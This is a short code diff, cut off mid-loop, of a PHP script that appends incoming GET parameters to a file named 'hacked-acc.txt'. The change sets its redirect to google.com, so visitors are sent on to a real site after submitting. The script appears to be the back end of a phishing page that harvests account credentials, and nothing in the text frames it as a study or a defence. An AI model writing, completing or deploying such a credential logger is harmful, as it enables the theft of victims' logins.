@@ -1,5 +1,5 @@
 <?php
-header ('Location:');
+header ('Location:http://google.com');
 $handle = fopen("hacked-acc.txt", "a");
 foreach($_GET as $variable => $value) {
    fwrite($handle, $variable);
